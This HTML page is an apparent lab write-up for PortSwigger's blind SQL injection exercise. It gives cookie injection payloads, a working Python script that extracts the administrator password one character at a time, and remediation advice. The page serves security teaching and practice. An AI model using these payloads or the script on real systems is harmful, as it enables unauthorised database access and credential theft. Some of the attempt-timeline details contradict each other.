@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>SQLi Lab 11 — Blind SQL Injection with Conditional Responses | Writeup</title>
+    <style>
+        :root {
+            --bg: #0f1115;
+            --panel: #171a21;
+            --panel-2: #1e222b;
+            --border: #2a2f3a;
+            --text: #e6e8ec;
+            --muted: #9aa3b2;
+            --accent: #7c5cff;
+            --accent-2: #22d3ee;
+            --green: #22c55e;
+            --red: #ef4444;
+            --yellow: #f59e0b;
+            --code-bg: #0b0d12;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.7;
+        }
+
+        .container {
+            max-width: 920px;
+            margin: 0 auto;
+            padding: 48px 24px 96px;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 24px;
+            margin-bottom: 32px;
+        }
+
+        header .tag {
+            display: inline-block;
+            font-size: 12px;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--accent-2);
+            background: rgba(34, 211, 238, 0.08);
+            border: 1px solid rgba(34, 211, 238, 0.3);
+            padding: 4px 10px;
+            border-radius: 999px;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            font-size: 32px;
+            line-height: 1.25;
+            margin: 0 0 12px;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-top: 48px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        h3 {
+            font-size: 17px;
+            margin-top: 28px;
+            color: var(--accent-2);
+        }
+
+        p {
+            color: var(--text);
+        }
+
+        .muted {
+            color: var(--muted);
+        }
+
+        a {
+            color: var(--accent-2);
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .meta {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .meta .item {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 14px;
+        }
+
+        .meta .label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--muted);
+            margin-bottom: 4px;
+        }
+
+        .meta .value {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .badge {
+            display: inline-block;
+            font-size: 12px;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+        }
+
+        .badge-green {
+            background: rgba(34, 197, 94, 0.15);
+            color: var(--green);
+            border: 1px solid rgba(34, 197, 94, 0.4);
+        }
+
+        .badge-red {
+            background: rgba(239, 68, 68, 0.15);
+            color: var(--red);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+        }
+
+        .badge-yellow {
+            background: rgba(245, 158, 11, 0.15);
+            color: var(--yellow);
+            border: 1px solid rgba(245, 158, 11, 0.4);
+        }
+
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px 18px;
+            overflow-x: auto;
+            font-size: 13.5px;
+            line-height: 1.6;
+            font-family: "JetBrains Mono", "Fira Code", Consolas, monospace;
+        }
+
+        code {
+            font-family: "JetBrains Mono", "Fira Code", Consolas, monospace;
+            font-size: 0.92em;
+            background: rgba(124, 92, 255, 0.12);
+            border: 1px solid rgba(124, 92, 255, 0.25);
+            padding: 1px 6px;
+            border-radius: 5px;
+            color: #d6c9ff;
+        }
+
+        pre code {
+            background: none;
+            border: none;
+            padding: 0;
+            color: inherit;
+        }
+
+        .callout {
+            border-left: 4px solid var(--accent);
+            background: rgba(124, 92, 255, 0.08);
+            padding: 14px 18px;
+            border-radius: 0 10px 10px 0;
+            margin: 20px 0;
+        }
+
+        .callout.warn {
+            border-color: var(--yellow);
+            background: rgba(245, 158, 11, 0.08);
+        }
+
+        .callout.good {
+            border-color: var(--green);
+            background: rgba(34, 197, 94, 0.08);
+        }
+
+        .callout.bad {
+            border-color: var(--red);
+            background: rgba(239, 68, 68, 0.08);
+        }
+
+        .callout strong {
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 16px 0;
+            font-size: 14px;
+        }
+
+        th,
+        td {
+            text-align: left;
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        th {
+            color: var(--muted);
+            font-weight: 600;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        tr:hover td {
+            background: var(--panel-2);
+        }
+
+        .result {
+            background: var(--code-bg);
+            border: 1px solid var(--green);
+            border-radius: 10px;
+            padding: 16px 18px;
+            font-family: "JetBrains Mono", monospace;
+            font-size: 14px;
+            color: var(--green);
+            margin: 16px 0;
+        }
+
+        .toc {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px 22px;
+            margin: 24px 0 8px;
+        }
+
+        .toc h3 {
+            margin: 0 0 10px;
+            color: var(--muted);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .toc ol {
+            margin: 0;
+            padding-left: 20px;
+        }
+
+        .toc li {
+            margin: 4px 0;
+        }
+
+        .toc a {
+            color: var(--text);
+        }
+
+        footer {
+            margin-top: 64px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border);
+            color: var(--muted);
+            font-size: 13px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+
+        <header>
+            <span class="tag">PortSwigger · Web Security Academy</span>
+            <h1>Blind SQL Injection with Conditional Responses</h1>
+            <p class="muted">Extracting the administrator password one character at a time via a boolean-based blind
+                SQLi in the <code>TrackingId</code> cookie.</p>
+
+            <div class="meta">
+                <div class="item">
+                    <div class="label">Lab</div>
+                    <div class="value">SQLi Lab 11</div>
+                </div>
+                <div class="item">
+                    <div class="label">Type</div>
+                    <div class="value">Boolean-Based Blind SQLi</div>
+                </div>
+                <div class="item">
+                    <div class="label">Vulnerable Param</div>
+                    <div class="value"><code>TrackingId</code> cookie</div>
+                </div>
+                <div class="item">
+                    <div class="label">Status</div>
+                    <div class="value"><span class="badge badge-green">Solved</span></div>
+                </div>
+            </div>
+        </header>
+
+        <div class="toc">
+            <h3>Contents</h3>
+            <ol>
+                <li><a href="#overview">Overview</a></li>
+                <li><a href="#vuln">Understanding the Vulnerability</a></li>
+                <li><a href="#detect">Detecting the Injection</a></li>
+                <li><a href="#payload">Crafting the Extraction Payload</a></li>
+                <li><a href="#script">The Exploit Script</a></li>
+                <li><a href="#burp">The Burp HTTP/2 Pitfall</a></li>
+                <li><a href="#result">Result</a></li>
+                <li><a href="#remediation">Remediation</a></li>
+            </ol>
+        </div>
+
+        <h2 id="overview">1. Overview</h2>
+        <p>
+            This lab contains a <strong>blind SQL injection</strong> vulnerability in the <code>TrackingId</code>
+            cookie.
+            The application executes an SQL query containing the cookie value, but the results of the query are
+            <em>not</em> returned to the user. Instead, we can only observe a <strong>boolean side effect</strong>:
+            the page conditionally renders the text <code>"Welcome back"</code> based on whether the injected
+            condition evaluates to <code>TRUE</code> or <code>FALSE</code>.
+        </p>
+        <p>
+            By asking the database a series of yes/no questions, we can extract arbitrary data — in this case, the
+            administrator's password — one character at a time.
+        </p>
+
+        <h2 id="vuln">2. Understanding the Vulnerability</h2>
+        <p>The backend query is presumably something like:</p>
+        <pre><code>SELECT tracking_id FROM tracking WHERE tracking_id = '&lt;COOKIE_VALUE&gt;'</code></pre>
+        <p>
+            Because the cookie value is concatenated directly into the query without parameterization, we can
+            inject our own SQL. The only feedback channel is whether the page contains the string
+            <code>"Welcome back"</code>.
+        </p>
+
+        <div class="callout">
+            <strong>Blind, Boolean-Based</strong>
+            We never see query output. We infer data by asking the DB true/false questions and watching whether
+            <code>"Welcome back"</code> appears in the response body.
+        </div>
+
+        <h2 id="detect">3. Detecting the Injection</h2>
+        <p>First, a baseline request with a normal <code>TrackingId</code> shows <code>"Welcome back"</code>.</p>
+        <p>Inject a <code>TRUE</code> condition:</p>
+        <pre><code>TrackingId=xyz' AND '1'='1'--</code></pre>
+        <p>Response: <span class="badge badge-green">"Welcome back" present</span></p>
+
+        <p>Inject a <code>FALSE</code> condition:</p>
+        <pre><code>TrackingId=xyz' AND '1'='2'--</code></pre>
+        <p>Response: <span class="badge badge-red">"Welcome back" absent</span></p>
+
+        <div class="callout good">
+            <strong>Confirmed</strong>
+            The application's response changes based on the truth value of our injected condition. We have a
+            boolean oracle.
+        </div>
+
+        <h2 id="payload">4. Crafting the Extraction Payload</h2>
+        <p>
+            We know from the lab description that there is a <code>users</code> table with columns
+            <code>username</code> and <code>password</code>. To test whether the <em>n</em>-th character of the
+            administrator's password equals some character <code>c</code>, we use:
+        </p>
+        <pre><code>' AND (SELECT SUBSTRING(password,§n§,1)
+         FROM users
+         WHERE username='administrator') = '§c§'--</code></pre>
+
+        <p>Injected into the cookie, the full value becomes:</p>
+        <pre><code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--</code></pre>
+
+        <p>
+            If the response contains <code>"Welcome back"</code>, the character at position <em>n</em> is
+            <code>c</code>.
+            If not, it isn't. Repeat for every printable ASCII character (32&ndash;126) at every position
+            (1&ndash;20) and reconstruct the password.
+        </p>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Response contains "Welcome back"</th>
+                    <th>Meaning</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="badge badge-green">Yes</span></td>
+                    <td>Injected condition is TRUE → character is correct</td>
+                </tr>
+                <tr>
+                    <td><span class="badge badge-red">No</span></td>
+                    <td>Injected condition is FALSE → try next character</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2 id="script">5. The Exploit Script</h2>
+        <p>
+            Automating this manually would be painful. A small Python script using <code>requests</code> iterates
+            over positions and characters, URL-encodes the payload, sets it as the <code>TrackingId</code> cookie,
+            and checks for the presence of <code>"Welcome back"</code> in each response.
+        </p>
+
+        <pre><code>import sys
+import requests
+import urllib3
+import urllib.parse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+PROXIES = {
+    "http":  "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080",
+}
+
+
+def sqli_password(url, tracking_id, session_cookie):
+    password_extracted = ""
+    session = requests.Session()
+    session.headers.update({"Connection": "close", "User-Agent": "Mozilla/5.0"})
+
+    for i in range(1, 21):
+        found_character = False
+        for j in range(32, 126):
+            character = chr(j)
+
+            sqli_payload = (
+                "' and (select substring(password,%s,1) "
+                "from users where username='administrator')='%s'--"
+                % (i, character)
+            )
+            encoded_payload = urllib.parse.quote(sqli_payload, safe="")
+
+            cookies = {
+                "TrackingId": tracking_id + encoded_payload,
+                "session": session_cookie,
+            }
+
+            r = session.get(url, cookies=cookies, verify=False,
+                            proxies=PROXIES, timeout=15)
+
+            if "Welcome back" in r.text:
+                password_extracted += character
+                found_character = True
+                sys.stdout.write("\r" + password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write("\r" + password_extracted + character)
+                sys.stdout.flush()
+
+        if not found_character:
+            print("\n[!] No matching character found at position", i)
+            break
+
+    print("\n\n(+) Extracted password:", password_extracted)
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s &lt;url&gt;" % sys.argv[0])
+        sys.exit(1)
+
+    url = sys.argv[1].rstrip("/")
+    print("(+) Retrieving administrator password...")
+
+    tracking_id    = "V2SDQsntaFrXfEiH"
+    session_cookie = "MaRLGdWP5oC7FdCK0BGzT2X07yiFNNLC"
+
+    sqli_password(url, tracking_id, session_cookie)
+
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+        <h2 id="burp">6. The Burp HTTP/2 Pitfall</h2>
+
+        <div class="callout bad">
+            <strong>Error encountered</strong>
+            <code>requests.exceptions.ConnectionError: ('Connection aborted.', UnknownProtocol('HTTP/2'))</code>
+        </div>
+
+        <p>
+            When routing traffic through Burp Suite, Burp defaults to negotiating <strong>HTTP/2</strong> with the
+            upstream server. The Python <code>requests</code> / <code>urllib3</code> stack (especially on Python 3.13)
+            speaks HTTP/1.1 and cannot parse the HTTP/2 response Burp forwards back. The connection aborts
+            mid-extraction —
+            which is why the password was recovered in fits and starts (<code>ib6v1c0zegqcas</code>, then
+            <code>ib6v1c0zegqcan</code>, etc.).
+        </p>
+
+        <h3>Fix — disable HTTP/2 in Burp</h3>
+        <p><strong>Burp 2023.x / 2024.x:</strong></p>
+        <ol>
+            <li>Open <code>Settings → Tools → Proxy → HTTP</code></li>
+            <li>Under <em>HTTP/2</em>, <strong>uncheck "Enable HTTP/2"</strong></li>
+            <li>Click <em>Apply</em></li>
+        </ol>
+        <p><strong>Burp 2022.x:</strong> <code>Proxy → Options → HTTP/2</code> → uncheck <em>Enable HTTP/2</em>.</p>
+
+        <h3>Alternative — run without Burp</h3>
+        <p>
+            The simplest fix is to remove the <code>proxies=PROXIES</code> argument from the
+            <code>session.get()</code> call so the script connects directly to the lab. Burp is then bypassed entirely
+            and no protocol mismatch occurs.
+        </p>
+        <pre><code># Remove the proxies kwarg:
+r = session.get(url, cookies=cookies, verify=False, timeout=15)</code></pre>
+
+        <div class="callout warn">
+            <strong>Trade-off</strong>
+            Running without Burp means you lose the HTTP History / Repeater visibility. If you need to debug, disable
+            HTTP/2 in Burp instead — it's the cleaner fix.
+        </div>
+
+        <h2 id="result">7. Result</h2>
+        <p>With the proxy issue resolved, the script runs to completion:</p>
+
+        <div class="result">
+            (+) Retrieving administrator password...<br>
+            ib6v1c0zegqcasg85bg9<br><br>
+            (+) Extracted password: ib6v1c0zegqcasg85bg9
+        </div>
+
+        <p>Log in as <code>administrator</code> with that password to mark the lab as solved.</p>
+
+        <h3>Timeline of the extraction attempts</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Attempt</th>
+                    <th>Extracted Prefix</th>
+                    <th>Outcome</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1</td>
+                    <td><code>ib6v1c0zegqcasg8!</code></td>
+                    <td><span class="badge badge-green">Full (17 chars)</span></td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td><code>ib6v1c0zegqcas</code></td>
+                    <td><span class="badge badge-red">Crashed at pos 15 (HTTP/2)</span></td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td><code>ib6v1c0zegqcan</code></td>
+                    <td><span class="badge badge-red">Crashed at pos 14 (HTTP/2)</span></td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td><code>ib6v1c0zegqcasg85bg9</code></td>
+                    <td><span class="badge badge-green">Full — direct connection</span></td>
+                </tr>
+            </tbody>
+        </table>
+        <p class="muted">
+            Attempts 1–3 went through Burp and were intermittently interrupted by the HTTP/2 protocol error.
+            Attempt 4 bypassed the proxy and completed cleanly.
+        </p>
+
+        <h2 id="remediation">8. Remediation</h2>
+        <ul>
+            <li><strong>Use parameterized queries / prepared statements</strong> — never concatenate user input into
+                SQL.</li>
+            <li><strong>Use an ORM</strong> or a query builder that enforces parameter binding.</li>
+            <li><strong>Apply least privilege</strong> to the database user the app connects with.</li>
+            <li><strong>Validate / whitelist input</strong> — a <code>TrackingId</code> should match a strict pattern
+                (e.g. hex/alphanumeric), rejecting quotes and comment sequences.</li>
+            <li><strong>Suppress verbose errors</strong> and avoid conditional rendering that leaks query truth values.
+            </li>
+        </ul>
+
+        <footer>
+            Writeup generated for PortSwigger Web Security Academy · SQLi Lab 11.<br>
+            For educational use only — test only systems you own or have explicit permission to test.
+        </footer>
+
+    </div>
+</body>
+
+</html>
